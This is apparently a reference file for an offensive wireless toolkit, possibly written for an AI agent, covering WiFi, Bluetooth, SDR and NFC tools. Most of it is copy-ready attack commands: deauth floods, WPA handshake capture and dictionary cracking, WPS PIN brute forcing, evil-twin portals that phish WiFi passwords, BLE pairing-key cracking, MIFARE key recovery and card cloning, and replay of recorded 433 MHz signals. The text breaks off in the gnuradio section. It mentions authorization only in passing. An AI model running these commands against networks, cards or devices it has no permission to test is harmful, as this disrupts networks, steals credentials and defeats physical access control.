# Wireless (WiFi/Bluetooth/SDR/NFC)

**English** · [简体中文](06-wireless.zh-CN.md)

> **When to read this file**: when the task involves WiFi auditing (WPA handshake/WPS/evil twin), monitor-mode packet capture, Bluetooth/BLE scanning and sniffing, SDR radio (HackRF/gqrx/GNU Radio), or NFC/MIFARE card key recovery.

## Quick Decision Table

| Scenario | First choice | Alternatives | Key difference |
|---|---|---|---|
| WPA/WPA2 handshake capture + dictionary cracking | aircrack-ng suite | wifite | The suite gives fine-grained control; wifite runs the same workflow fully automatically |
| One-command automated wireless audit | wifite | airgeddon | wifite is lightweight and unattended; airgeddon has a broader feature set (menu-driven) |
| WPS PIN online brute forcing | reaver | bully | reaver has a mature ecosystem; bully has fewer dependencies and better memory/CPU efficiency |
| WPS pixie dust offline attack | reaver -K 1 | pixiewps | Try offline first (seconds); switch to online brute forcing on failure |
| Clientless PMKID capture | bettercap (wifi.assoc) | hcxdumptool | Get the hash with no client present, then crack with hashcat |
| Passive wireless discovery / wardriving | kismet | airodump-ng | kismet is passive, multi-source (WiFi/BT/SDR), with GPS/Web UI |
| WiFi intranet MITM / deauthentication | bettercap | airgeddon | One bettercap binary covers recon + deauth + sniffing |
| Rogue AP / phishing portal | wifiphisher | wifipumpkin3 | wifiphisher targets credential phishing; wifipumpkin3 is a pluggable framework |
| Bluetooth Classic device enumeration | btscanner | bluelog | btscanner extracts HCI/SDP details; bluelog only does fast counting |
| Physical location of Bluetooth devices | blueranger | — | Uses link quality (LQ) to approximate distance |
| BLE sniffing and decryption | ubertooth + crackle | — | ubertooth hardware captures; crackle cracks TK/LTK |
| SDR spectrum browsing / signal hunting | gqrx | hackrf_transfer | gqrx is a GUI spectrum analyzer; hackrf_transfer is a CLI receiver/transmitter |
| sub-GHz device reverse engineering | rfcat | gnuradio | rfcat does interactive reprogramming (Yard Stick One etc.) |
| MIFARE Classic key recovery | mfoc | mfcuk | mfoc runs the nested attack (needs one known key); mfcuk runs DarkSide (all keys unknown) |
| WEP cracking | aircrack-ng + aireplay-ng | wesside-ng | WEP is obsolete; use only against legacy networks |
| LEAP/PPTP credential attacks | asleap | — | Targets flaws in Cisco LEAP |

## Core Tools in Depth

### Complete WPA/WPA2 Handshake Cracking Workflow (suite tools in concert)

```bash
# 0. 准备:清除干扰进程,开启 monitor 模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0                 # 生成 wlan0mon 监控接口
# 1. 扫描发现目标(BSSID / 信道 / 已连接客户端 MAC)
sudo airodump-ng wlan0mon
# 2. 锁定目标,定向抓包(界面右上角出现 "WPA handshake: <bssid>" 即成功)
sudo airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon
# 3. 另开一个终端:deauth 已连接客户端,迫使其重连产生四次握手
sudo aireplay-ng --deauth 10 -a <bssid> -c <client-mac> wlan0mon
# 4. 离线字典破解(握手到手后随时可跑)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <bssid> capture-01.cap
```

---

### airmon-ng — Monitor-mode preparation and interference troubleshooting (aircrack-ng suite)

**Purpose**: Switches the wireless adapter into monitor mode and checks for/kills interfering processes that would break capture; step 0 of the whole aircrack-ng workflow.
**Installation**: Pre-installed on Kali (aircrack-ng package).
**When to use**: Mandatory before any WiFi capture/injection; come back here first whenever captures "see no packets" or "the channel keeps hopping".

```bash
# 列出会干扰的进程(NetworkManager/wpa_supplicant 是常见元凶)
sudo airmon-ng check
# 杀掉干扰进程(会断网,预期行为)
sudo airmon-ng check kill
# 开启 monitor 模式(可指定初始信道)
sudo airmon-ng start wlan0
sudo airmon-ng start wlan0 6
# 验证:出现 wlan0mon(Type: monitor)
iw dev
# 手动指定信道(防止信道漂移)
sudo iw dev wlan0mon set channel <channel>
# 收尾:退出 monitor 模式并恢复网络
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**Practical tips**:
- The three staples of interference troubleshooting: `rfkill unblock all` (hard/soft block) → `airmon-ng check kill` (processes holding the interface) → `iw dev` to confirm interface state; the "valid interface combinations" in `iw phy` output should include monitor.
- Manual equivalent when airmon-ng fails: `sudo ip link set wlan0 down && sudo iw dev wlan0 set monitor none && sudo ip link set wlan0 up`.
- Common pitfalls: NetworkManager retaking the interface and causing channel drift (run check kill first); USB3 ports inject RF interference into 2.4GHz adapters, prefer USB2 or add shielding; inside VMs use USB passthrough, and the host must not use the adapter at the same time.
- The adapter must support monitor mode + injection (classic picks: Atheros AR9271, RTL8812AU/RTL8814AU); built-in cards (some Broadcom/Intel models) have limited capture capability.

### airodump-ng — Wireless packet capture and target discovery

**Purpose**: 802.11 packet capture, AP/client enumeration, locating the target BSSID and channel, and capturing the WPA four-way handshake; the .cap/.csv files it writes feed aircrack-ng/airgraph-ng.
**Installation**: Pre-installed on Kali (aircrack-ng package).
**When to use**: Use it when you need precise control over capture targets (lock BSSID + channel); use kismet for wide-area passive surveys.

```bash
# 全信道扫描,观察所有 AP(BSSID/CH/PWR/ENC/ESSID)与下方客户端列表
sudo airodump-ng wlan0mon
# 扫描 2.4G + 5G
sudo airodump-ng --band abg wlan0mon
# 锁定目标 AP 定向抓包,-w 指定输出前缀(生成 .cap/.csv/.netxml)
sudo airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon
# 同时过滤目标客户端,减少写入量
sudo airodump-ng -c <channel> --bssid <bssid> --ignore-negative-one -w capture wlan0mon
```

**Practical tips**:
- Capture succeeds once `WPA handshake: <bssid>` or `PMKID` appears at the top; if it never does, run an aireplay-ng deauth to trigger reconnection.
- Clients shown as `not associated` in the STATION section cannot be used for targeted deauths; pick associated clients (those tied to a BSSID).
- `--ignore-negative-one` suppresses channel -1 false positives; use `--band a` for 5GHz only.
- A weak client may not receive the deauth; use a broadcast deauth (omit -c) or move closer to the target.
- The CSV produced by `-w` can be fed to `airgraph-ng` to draw an AP-client relationship graph (see the quick reference table).

### aireplay-ng — Injection and deauthentication attacks

**Purpose**: Injects frames at target APs/clients — deauth to force reconnection and trigger the handshake, injection to speed up WEP cracking, and injection capability testing.
**Installation**: Pre-installed on Kali (aircrack-ng package).
**When to use**: The "catalyst" step when no handshake shows up; run an injection test before attacking to confirm the adapter works.

```bash
# 注入能力测试(出现 "Injection is working!" 即正常)
sudo aireplay-ng --test wlan0mon
# 对指定客户端发送 10 个 deauth 帧(-a=AP,-c=客户端)
sudo aireplay-ng --deauth 10 -a <bssid> -c <client-mac> wlan0mon
# 广播 deauth(对所有客户端,不加 -c)
sudo aireplay-ng --deauth 10 -a <bssid> wlan0mon
# WEP 附属攻击:伪关联 + ARP 注入刷 IV
sudo aireplay-ng --fakeauth 0 -a <bssid> wlan0mon
sudo aireplay-ng --arpreplay -b <bssid> -h <client-mac> wlan0mon
```

**Practical tips**:
- Keep the deauth count modest (10-20 is enough); sustained bursts disrupt the target network for long stretches and may trigger WIDS/lockout.
- When a deauth hangs with no output, the usual cause is a channel mismatch: the interface aireplay-ng uses must sit on the same channel as the AP (run `iw dev wlan0mon set channel <ch>` first).
- Many 5GHz adapters cannot inject on that band; verify first with `--test`.
- For WEP there are also `--chopchop` and `--fragment` (used when no valid client is available); like `--arpreplay`, they are all IV-generation techniques.

### aircrack-ng — WEP/WPA key cracking

**Purpose**: Offline cracking of capture files — dictionary attacks for WPA/WPA2 (PSK), PTW/FMS statistical attacks for WEP; supports multi-core parallelism.
**Installation**: Pre-installed on Kali (aircrack-ng package).
**When to use**: The final cracking step once the handshake/IVs are in hand; switch to hashcat when you need GPU acceleration or PMKID hash modes.

```bash
# WPA 字典破解,-b 指定目标网络(多字典用逗号分隔)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <bssid> capture-01.cap
# 按 ESSID 选择目标,-p 指定线程,-l 把密钥写入文件
aircrack-ng -w <wordlist1>,<wordlist2> -e <essid> -p 4 -l key.txt capture-01.cap
# WEP:对累积的 IV 直接跑 PTW 攻击
aircrack-ng capture-01.cap
```

**Practical tips**:
- On Kali, decompress rockyou first: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.
- "No valid WPA handshakes found" means the capture holds no complete handshake (possibly only the first 2 packets); go back to airodump/aireplay and recapture; `wpaclean` can pre-extract it (note it may corrupt handshakes — if it fails, use the raw cap directly).
- Clientless route: PMKIDs (already inside association frames) can be captured with `hcxdumptool -i wlan0mon -o dump.pcapng`, converted with `hcxpcapngtool -o hash.22000 dump.pcapng`, then cracked with `hashcat -m 22000` (apt install hcxdumptool hcxtools).
- WEP's PTW attack generally needs tens of thousands of IVs, accumulated via aireplay-ng injection; when a WPA key is strong enough, dictionary cracking inevitably fails — an assessment conclusion of "handshake verified, offline cracking not feasible" is enough.
- Compared with cowpatty: aircrack-ng is the general-purpose standard; cowpatty's precomputed PMK files are faster for "repeated testing against the same SSID".

### wifite — One-command automated wireless audit

**Purpose**: Automates the full pipeline: monitor mode → scan → target selection → handshake/WPS/PMKID capture → cracking via aircrack-ng/reaver.
**Installation**: `sudo apt install wifite` (often pre-installed on Kali).
**When to use**: Fast results in CTF/authorized tests and unattended batch runs; use the low-level suite when you need precise control over each step's parameters.

```bash
# 全自动:扫描并列出目标,Ctrl+C 后按编号选择
sudo wifite
# 先杀干扰进程再启动(推荐)
sudo wifite --kill
# 只攻击信号强于 50 的 WPS 网络(官网示例)
sudo wifite -pow 50 -wps
# 只打 WPA/WEP 目标,指定破解字典
sudo wifite -wpa -wep --dict /usr/share/wordlists/rockyou.txt
```

**Practical tips**:
- Interactive flow: start scanning → Ctrl+C to stop → enter a target number to attack; results and handshake files land under `hs/` in the current directory.
- Per target it automatically tries: PMKID (clientless) → client deauth to grab the handshake → WPS pixie dust → online PIN, giving up only when everything fails.
- Under the hood it is just airmon/airodump/aireplay/aircrack-ng/reaver, so troubleshoot exactly as in the manual workflow.
- With multiple adapters it auto-picks the first monitor-capable one; mind VM passthrough with external USB adapters.

### wash — WPS network discovery (shipped in the reaver package)

**Purpose**: Scans APs with WPS enabled and lists BSSID/channel/signal/WPS version/lock state (Lck) for target selection by reaver/bully.
**Installation**: `sudo apt install reaver` (wash is a binary in the same package).
**When to use**: The first step in deciding "can this target be attacked over the WPS route".

```bash
# 在 6 信道扫描 WPS AP,-C 忽略帧校验错误(官网示例)
wash -i wlan0mon -c 6 -C
# 不指定信道则全信道轮扫
wash -i wlan0mon
```

**Practical tips**:
- An `Lck` value of Yes means the AP has locked WPS (protection after repeated failed attempts); reaver/bully are basically powerless — you can only wait out the cooldown (usually minutes to hours).
- Old devices reporting `WPS 1.0` from Realtek/Broadcom/Ralink/MTK are the most vulnerable to pixie dust.
- If wash output is empty, first check whether monitor mode really came up and whether the interface channel has drifted.

### reaver — WPS PIN online brute forcing

**Purpose**: Tries 8-digit PINs one by one against WPS-enabled APs; on success it recovers the WPA PSK and AP configuration directly.
**Installation**: `sudo apt install reaver`.
**When to use**: The main attack when the target's WPS is unlocked and pixie dust failed; time-consuming (hours to days).

```bash
# 标准在线爆破,-v 显示详细进度(官网示例模式)
reaver -i wlan0mon -b <bssid> -v
# 指定信道更稳定
reaver -i wlan0mon -b <bssid> -c <channel> -v
# 首选先试 pixie dust 离线攻击(内部调用 pixiewps,秒级出结果)
reaver -i wlan0mon -b <bssid> -K 1
# 从已知 PIN 继续(断点续跑)
reaver -i wlan0mon -b <bssid> -p <pin>
```

**Practical tips**:
- Recommended attack order: `reaver -K 1` (offline) → stop if it succeeds; switch to online brute forcing only on failure.
- While `Lck` shows locked, widen the attempt interval with `-d <seconds>`, tune the receive timeout with `-t <seconds>`, or idle until the cooldown expires; hammering away only extends the lockout.
- Session state (PIN progress) is stored in a `.wpc` file in the working directory, so reruns need not start over; on success the WPS PIN and WPA PSK are printed on screen.
- Compared with bully: reaver has fuller documentation and tooling (bettercap/wifite integration).

### bully — WPS brute forcing (C implementation, reaver alternative)

**Purpose**: Same principle as reaver (the WPS design flaw), but with fewer dependencies, better memory/CPU efficiency, and steadier endianness handling.
**Installation**: `sudo apt install bully`.
**When to use**: A fallback when reaver misbehaves against a specific AP (association failures/timeouts); also when you want a small resource footprint.

```bash
# 按 ESSID 攻击(官网示例)
bully -e <essid> wlan0mon
# 按 BSSID + 信道(更稳定)
bully -b <bssid> -c <channel> wlan0mon
```

**Practical tips**:
- PIN progress and the random PIN table are stored in `~/.bully/pins`; runs resume after interruption.
- Startup complaints like `Unknown frequency` / abnormal beacon info are mostly driver channel-reporting problems; pinning `-c` works around them.
- `Beacon information element indicates WPS is locked` in the output means the target is locked; wait or switch targets.
- Pick either reaver or bully — never run both against the same AP (they interfere with each other and trigger lockout).

### pixiewps — WPS pixie dust offline cracking

**Purpose**: Exploits the insufficient E-S1/E-S2 entropy of some APs to compute the WPS PIN fully offline (in seconds), with no online interaction.
**Installation**: `sudo apt install pixiewps`.
**When to use**: The first strike against a WPS target; usually invoked automatically via `reaver -K 1`, but it can also be fed data manually.

```bash
# 手动模式:从 reaver/bully -v 输出或 bettercap 抓包中提取各参数
pixiewps -e <pke> -r <pkr> -s <ehash1> -z <ehash2> -a <authkey> -n <enonce>
```

**Practical tips**:
- Parameter meanings: PKE/PKR are the DH public keys, E-Hash1/E-Hash2 are hashes of the two PIN halves, plus AuthKey and E-Nonce; they all come from the WPS M1-M4 messages.
- In the field, prefer automatic parameter collection via `reaver -K 1` or wifite's pixiedust mode; manual mode is only for reproduction/research.
- Output like `WPS pin: <8-digit>` means success; hand it back to reaver to redeem the PSK. Devices with a zero/low-entropy `Seed` (old RTL/MTK firmware) hit often; modern devices are mostly patched.

### bettercap — All-in-one WiFi recon/deauth/sniffing framework

**Purpose**: An interactive session framework — wifi.recon discovers APs and clients passively, wifi.deauth grabs handshakes, wifi.assoc grabs PMKIDs, with integrated on-network sniffing and MITM.
**Installation**: `sudo apt install bettercap`.
**When to use**: When you want the whole chain — discovery → deauth → handshake capture → intranet MITM — in one tool; especially good for the clientless PMKID route.

```bash
# 启动交互会话(wifi.recon 会自动把无线口切到 monitor 模式)
sudo bettercap -iface wlan0
# 非交互一次性执行
sudo bettercap -iface wlan0 -eval "wifi.recon on; sleep 15; wifi.show"

# 会话内常用命令:
wifi.recon on                       # 开始全信道跳扫
wifi.recon.channel 1,6,11           # 锁定信道集合(或 all;只看 5GHz 用 36,40,44,48 后 wifi.show)
wifi.show                           # 列出 AP(含客户端数/厂商/信号)
set wifi.show.filter <正则>         # 按正则过滤 wifi.show 输出的 AP
wifi.deauth <bssid>                 # 对该 AP 全部客户端发 deauth,抓握手
wifi.assoc <bssid>                  # 发关联请求尝试抓 PMKID(免客户端)
set wifi.handshakes.file hs.pcap    # 握手落盘路径(需在 wifi.recon on 之前设置;配合 wifi.handshakes.aggregate 控制单文件/按网络分文件)
```

**Practical tips**:
- The handshake pcap can go straight into aircrack-ng; convert PMKIDs with hcxpcapngtool to 22000 format and crack with hashcat.
- `events.stream on` streams events live (assoc/deauth/handshake captures).
- Follow-up on-network actions (net.probe/net.sniff/arp.spoof and other proxy modules) also live in bettercap; once you hold a WiFi foothold you can slide straight into intranet testing.
- Deauth needs injection capability on the target band; on 5GHz, confirm adapter and channel support.

### kismet — Passive wireless discovery/wardriving/WIDS framework

**Purpose**: A multi-source passive detection framework — WiFi, Bluetooth, RTLSDR, plus dedicated sniffer plugins for Zigbee/BLE; device tracking, GPS tagging, Web UI; it sends nothing itself, so it rarely trips alarms.
**Installation**: `sudo apt install kismet` (the metapackage pulls in the capture plugins).
**When to use**: Wireless asset inventory, wardriving, and stealth reconnaissance; far broader coverage than airodump-ng, but no attack actions.

```bash
# 现代版:指定捕获源启动,然后浏览器打开 http://localhost:2501
kismet -c wlan0mon
# 官网旧版命令(kismet_server,常用于配合 gpsd 做wardriving)
kismet_server -c wlan0 --use-gpsd-gps
```

**Practical tips**:
- Modern Kismet manages monitor mode itself (via capture helpers), so running airmon-ng first is generally unnecessary.
- Supports simultaneous multi-source capture with `kismet -c wlan0 -c wlan1mon ...`; Bluetooth via the `kismet-capture-linux-bluetooth` package, Zigbee/BLE via plugin packages such as ti-cc-2531/nrf/ubertooth.
- Wardriving: with gpsd running (`systemctl start gpsd`), every AP/device record automatically carries coordinates and can be exported to netxml/pcap/JSON.
- The Web UI login hint (top-right corner) is printed in the terminal output on first launch; the data directory defaults to `/var/log/kismet/`.

### cowpatty — WPA-PSK dictionary attack and PMK precomputation

**Purpose**: A dictionary attack specialized for WPA/WPA2-PSK; after genpmk precomputes a PMK hash table for an SSID, repeated testing against the same SSID gets orders of magnitude faster.
**Installation**: `sudo apt install cowpatty`.
**When to use**: Use precomputation when testing the same SSID repeatedly (e.g. many targets sharing one ESSID in a client environment); for one-off cracking, aircrack-ng is enough.

```bash
# 直接字典攻击:pcap + 字典 + SSID
cowpatty -r <capture>.cap -f <wordlist> -s <essid>
# 预计算 PMK 表(官网示例:genpmk -f 字典 -d 输出 -s ESSID)
genpmk -f /usr/share/wordlists/nmap.lst -d cowpatty_dict -s <essid>
# 用预计算表 + 抓包文件破解(官网示例模式)
cowpatty -d cowpatty_dict -r Kismet-20181113-13-37-00-1.pcapdump -s <essid>
```

**Practical tips**:
- Output `The PSK is "xxx"` means success; `Collected all necessary data to mount crack` indicates the pcap holds a complete handshake.
- PMK tables are bound to the SSID; a different SSID forces recomputation (exactly WPA's precomputation-resistance design).
- genpmk's hash tables can be reused across the coWPAtty/airolib-ng ecosystem; for large-scale GPU cracking, still turn to hashcat.
- Kismet's pcapdump output can feed `-r` directly.

### airgeddon — Menu-driven all-in-one wireless audit suite

**Purpose**: An interactive menu tool written in bash; it wraps handshake capture, online/offline cracking, evil twin, captive portal, PMKID, WPS, and other workflows, and auto-detects interfaces and dependencies.
**Installation**: `sudo apt install airgeddon`.
**When to use**: When you don't want to hand-type long command chains, or need the evil twin + fake portal combo; weaker than the manual suite for deep troubleshooting.

```bash
sudo airgeddon
# 菜单内:选接口 → 置 monitor 模式 → 选攻击类型(握手捕获/evil twin/WPS/PMKID...)
```

**Practical tips**:
- The first screen runs a dependency check; install whatever it flags (it lists the required packages).
- The evil twin/captive portal workflows need a second adapter (or an interface bridged to the Internet); the menu states this explicitly.
- The handshake capture stage is essentially airodump + aireplay; troubleshoot failures like the manual workflow (channel/signal/interference).
- Fits quick demos in authorized red team work; reports should still attach raw output of the underlying tools as evidence.

### wifiphisher — Automated WiFi phishing (evil twin + fake portal)

**Purpose**: Automatically stands up an evil twin AP and deauths the original network to force reconnection, then pops a fake portal (e.g. "firmware upgrade, please enter your WiFi password") to harvest credentials; pure social engineering, no brute forcing.
**Installation**: `sudo apt install wifiphisher`.
**When to use**: Verifying the social-engineering risk of "will users submit credentials to a fake portal" during authorized red team engagements.

```bash
# 双网卡模式:-aI 做 AP,-eI 做干扰(deauth)源,-p 指定钓鱼场景
sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade
# 自定义恶意 SSID
sudo wifiphisher --essid "Free WiFi" -p <scenario>
```

**Practical tips**:
- `-aI` and `-eI` can be a managed/monitor split of one adapter, but two separate adapters give the best effect and stability.
- Scenario templates (phishing scenarios) decide the fake page content; `firmware-upgrade` is the classic WPA password phishing template.
- Victim credentials show up live in the running terminal; the test report must record the submitter's MAC/time as the evidence chain.
- Compared with wifipumpkin3: wifiphisher's scenarios work out of the box; wifipumpkin3 is more customizable/plugin-friendly.

### wifipumpkin3 — Rogue AP / MITM framework

**Purpose**: A rogue hotspot framework written in Python: fake AP, captive portal (captiveflask templates), DNS spoofing, proxy traffic interception, with plugin-based extension.
**Installation**: `sudo apt install wifipumpkin3`.
**When to use**: Red team scenarios needing a custom captive portal/proxy chain/plugins; more of a "framework" than wifiphisher.

```bash
sudo wifipumpkin3
# 控制台内快速起一个开放 rogue AP:
# >> set interface wlan0
# >> set ssid <essid>
# >> set proxy noproxy
# >> start
# 子工具 captiveflask(独立起假门户):
captiveflask -t <template> -p <port>
```

**Practical tips**:
- Inside the console, `help` lists all commands and `plugins` lists available plugins; on misconfiguration, `clear` first, then reconfigure.
- Once clients connect, its proxy modules (authproxy/captive) can intercept plaintext requests and credentials.
- Needs root and an adapter that supports AP (managed) mode; for some drivers, confirm AP-mode support with `iw list`.
- Unlike wifi-honey (pure honeypot/passive), this tool actively offers DHCP/a portal to lure connections.

### ubertooth — Open-source Bluetooth sniffing hardware platform

**Purpose**: Pairs with Ubertooth One hardware (2.4GHz) to passively sniff BLE (Bluetooth Smart) connections and some Bluetooth Classic (BR) traffic; captures from the side without taking part in pairing.
**Installation**: `sudo apt install ubertooth`.
**When to use**: Traffic analysis of BLE devices (IoT/wearables), capturing pairing for crackle to decrypt, and Bluetooth Classic channel reconnaissance.

```bash
# 查看设备与固件版本
ubertooth-util -v
# 被动跟随经典蓝牙 piconet
ubertooth-rx
# BLE:跟随已建立连接并抓包
ubertooth-btle -f
# 经典组合:ubertooth 抓 BLE → FIFO → crackle 实时解密
mkfifo /tmp/btle.pipe
ubertooth-btle -f -c /tmp/btle.pipe
crackle -i /tmp/btle.pipe
```

**Practical tips**:
- Upgrade firmware with `ubertooth-dfu` (firmware package ubertooth-firmware, installed under /usr/share/ubertooth/firmware/); a version mismatch is a common cause of zero captures.
- Kismet integration: after installing `kismet-capture-ubertooth-one`, Kismet can capture directly.
- If BLE pairing uses Just Works/6-digit TK, crackle almost always recovers the LTK; LE Secure Connections pairing resists this attack.
- Without the hardware, a plain hci0 adapter can only scan actively and cannot sniff other devices' connections from the side.

### btscanner — Bluetooth information extraction (ncurses scanner)

**Purpose**: A full-screen scanner built on BlueZ; extracts target HCI/SDP details without pairing and keeps the connection to monitor RSSI and link quality; built-in OUI/device-class lookup.
**Installation**: `sudo apt install btscanner`.
**When to use**: Deep information gathering on discovered Bluetooth devices (services/vendor/class of device); more structured output than hcitool.

```bash
# 激活蓝牙适配器后启动
sudo hciconfig hci0 up
sudo btscanner
# 界面内:i = inquiry 扫描,s = bluetooth 扫描(可发现设备),b = 返回
```

**Practical tips**:
- Inquiry mode (i) finds "discoverable" devices; s mode reads names and class of device; in both, arrow keys open a detail page with the SDP service list.
- The adapter must be UP; if `hciconfig` is unavailable, `bluetoothctl power on` brings it up equivalently.
- Modern phones are undiscoverable by default, so not finding them is normal; discoverable devices are mostly speakers/car head units/IoT gadgets.
- Its output complements bluelog's log when building an on-site device inventory.

### bluelog — Fast Bluetooth on-site inventory scanner

**Purpose**: Counts discoverable Bluetooth devices in the area as fast as possible and logs every one; built for site surveys.
**Installation**: `sudo apt install bluelog`.
**When to use**: When you only need inventory facts like "how many Bluetooth targets are around, and their MAC list".

```bash
# 自动检测适配器并开始扫描,Ctrl+C 结束(官网示例)
sudo bluelog
# 指定 hci 接口
sudo bluelog -i hci0
```

**Practical tips**:
- Results are auto-written to `bluelog-<date-time>.log`, the PID file lives at /tmp/bluelog.pid, and it is easy to leave running in the background.
- Covers only "discoverable" devices; chain btscanner for depth and blueranger for location.
- Suits long unattended runs logging appearance/disappearance times, helping infer the owner's schedule (social-engineering evidence).

### blueranger — Bluetooth device location (LQ ranging)

**Purpose**: Uses the link quality (LQ) of l2cap pings to roughly judge how far away a Bluetooth device is; the higher the LQ, the closer in theory.
**Installation**: `sudo apt install blueranger`.
**When to use**: Physically locating discovered Bluetooth devices (finding people or devices in a server room/office).

```bash
# 用 hci1 适配器定位指定蓝牙地址(官网示例)
sudo blueranger hci1 <bdaddr>
# 结束连按两次 Ctrl+C
```

**Practical tips**:
- A Class 1 adapter (100mW) suits coarse long-range locating and Class 3 suits precise close-range locating — combine them, coarse first then fine.
- LQ is heavily affected by interference and antenna quality; readings are relative trends, not absolute distances — watch the change, not the value.
- Most devices accept unauthenticated l2cap pings, which is exactly the principle at work; some newer systems refuse them.

### crackle — BLE pairing crypto cracking and traffic decryption

**Purpose**: Exploits the low TK entropy of BLE legacy pairing to recover TK/STK/LTK and then decrypt all traffic between master and slave.
**Installation**: `sudo apt install crackle`.
**When to use**: Offline cracking once you have captured a pcap of the BLE pairing process (via ubertooth etc.).

```bash
# 从 pcap 恢复密钥并输出解密后的 pcap(官网示例模式)
crackle -i ltk_exchange.pcap -o ltk-decrypted.pcap
# 已知 LTK 时直接解密后续抓包
crackle -i <in.pcap> -o <out.pcap> -l <ltk>
```

**Practical tips**:
- Output `TK found: 000000` (a zero TK) means the target used Just Works pairing — it falls in seconds; `LTK found` gives the long-term key, after which every future connection of that device is decryptable.
- You must capture the complete pairing exchange (M1-M3); a capture that starts mid-way cannot recover the TK, leaving only the known-LTK mode.
- Open the decrypted pcap with Wireshark's btle dissector to inspect the GATT layer (control writes, sensor data).
- Modern devices using LE Secure Connections (ECDH) are unaffected by this attack.

### mfoc — MIFARE Classic key recovery (nested attack)

**Purpose**: Exploits the Crypto1 nested authentication vulnerability to derive all MIFARE Classic sector keys offline and dump the whole card; needs at least one valid known key (the default key list usually hits).
**Installation**: `sudo apt install mfoc`.
**When to use**: The first step of access-card/transit-card assessments: read the full card, then clone and analyze fields.

```bash
# 前置:启动读卡服务并用 libnfc 确认识卡(ACR122U 常用)
sudo systemctl start pcscd
nfc-list
# 用默认密钥表跑 nested 攻击,全卡导出为 dump 文件
sudo mfoc -O card_dump.mfd
# 已知某非默认密钥时追加提交
sudo mfoc -k FFFFFFFFFFFF -O card_dump.mfd
```

**Practical tips**:
- The `.mfd` output is a raw 1KB/4KB image; inspect sectors and access bits with `hexdump -C` or the mfoc ecosystem tools.
- mfoc fails when a sector has no known key at all — switch to mfcuk to recover the first key, then come back.
- Cloning onto a blank Chinese magic card (writable-UID card) is the usual deliverable check; cards whose sector-0 UID is unwritable need Gen1A/Gen2.
- When testing access-control systems, record the key-recovery time as risk evidence.

### mfcuk — MIFARE Classic DarkSide key recovery

**Purpose**: Uses the DarkSide error oracle to recover the first key of a MIFARE Classic card that has "no known keys at all"; the follow-up when mfoc fails.
**Installation**: `sudo apt install mfcuk`.
**When to use**: When the card's default keys were changed and mfoc has nowhere to start — pry out the first sector key.

```bash
# 对块 0 的 A 密钥跑 DarkSide(-C 必须显式连接读卡器;-v 2 显示进度)
sudo mfcuk -C -R 0:A -v 2
```

**Practical tips**:
- DarkSide depends on the reader's timing behavior; the ACR122U works well, and success rates differ widely across readers.
- Once you have one key, go straight back to `mfoc -k <recovered-key>` to pull the whole card; do not grind sector by sector with mfcuk.
- Works best in "interacting with a live reader" scenarios (on site with a powered reader); for pure offline card-only work, prefer mfoc directly.
- `-R <block>:<A|B>` selects the target block and key type; see `mfcuk -h` for details.

### mfterm — MIFARE Classic interactive terminal

**Purpose**: A command-line terminal for Mifare Classic 1K/4K cards: connect, authenticate, read/write blocks/sectors, import/export, with Tab completion and history.
**Installation**: `sudo apt install mfterm`.
**When to use**: Fine-grained read/write after key recovery (editing balance fields, verifying access bits, diffing clones).

```bash
sudo mfterm
# 终端内(支持 Tab 补全):
# connect          连接读卡器上的卡
# help             查看全部命令(read/write/dump/keys 等)
```

**Practical tips**:
- Forms a full chain with mfoc/mfcuk: mfoc recovers keys → mfterm `keys load` loads them → read/write and compare block by block.
- Writing blocks directly risks locking the card: `read` and record the original values and access bits first; wrong access bits can permanently kill a sector.
- For differential analysis, diff the dumps of the original and cloned cards to locate counters/sectors the access-control system writes back.

### hackrf — HackRF One SDR command-line transceiver tools

**Purpose**: The official toolset for HackRF One (30MHz-6GHz transceiver, 20MHz bandwidth): device identification, IQ recording/playback, firmware flashing.
**Installation**: `sudo apt install hackrf`.
**When to use**: Recording/replaying sub-GHz/ISM band signals, verifying replay attacks, and signal analysis together with gqrx/GNU Radio.

```bash
# 检测设备、读固件/序列号(攻击前先确认识别正常)
hackrf_info
# 接收:433.92MHz(ISM 常用遥控频段),2M 采样,IQ 存文件
hackrf_transfer -r <file>.iq -f 433920000 -s 2000000 -l 32 -g 32
# 发射回放:同参数回放录制的 IQ(-x 为发射增益)
hackrf_transfer -t <file>.iq -f 433920000 -s 2000000 -x 47
```

**Practical tips**:
- Parameter meanings: `-f` center frequency (Hz), `-s` sample rate, `-l` IF gain, `-g` RF gain, `-x` TX gain; `-f`/`-s` must match between recording and replay.
- The 20MHz bandwidth of the 2.4GHz WiFi band sits right at the edge of HackRF's capability; an atheros adapter is more practical for targeted WiFi capture.
- View IQ files in inspectrum's waterfall to locate signals, or visualize directly in gqrx; upgrade firmware with `hackrf_spiflash -w`.
- Confirm authorization and band legality before transmitting; power amplification needs an external amp (note `-a` enables the on-board PA — authorized scenarios only).

### gqrx — SDR spectrum analyzer (GNU Radio GUI)

**Purpose**: An open-source SDR receiver GUI: live spectrum/waterfall, demodulation (AM/FM/SSB/narrowband), IQ recording; supports RTL-SDR, HackRF, USRP, LimeSDR, and more.
**Installation**: `sudo apt install gqrx-sdr`.
**When to use**: The "eyes" of SDR reconnaissance — sweep for signals of interest, listen to demodulated output, record samples for later analysis.

```bash
# 启动后在 Configure 窗口选择设备(如 HackRF)、采样率与增益
gqrx
# 常用界面操作:拖动瀑布图改频率 / FFT Settings 调增益 / REC 按钮录制 IQ
```

**Practical tips**:
- Finding unknown emitters: watch the waterfall for bursts (remote keypresses, sensor reports), note the center frequency and bandwidth, then record with hackrf_transfer using those parameters.
- Remote control: enable Remote control (TCP) in settings and drive it from GNU Radio/scripts.
- When pairing with HackRF, disable hardware AGC and adjust LNA/VGA manually to avoid ADC clipping distortion.
- Use gqrx for receive-only analysis; switch to hackrf_transfer to transmit/replay — both share the same parameter scheme.

### gnuradio — SDR signal processing framework

**Purpose**: The de facto standard SDR framework: build transceivers and demodulators as flowgraphs (blocks); gnuradio-companion offers visual drag-and-drop development, Python/C++ underneath.
**Installation**: `sudo apt install gnuradio` (gnuradio-dev for development, gnuradio-doc for docs).
**When to use**: When the standard tools (gqrx/rfcat) are not enough — build custom protocol demodulators, signal generators, and SDR pipelines.

```bash
# 启动可视化流图开发环境
gnuradio-companion
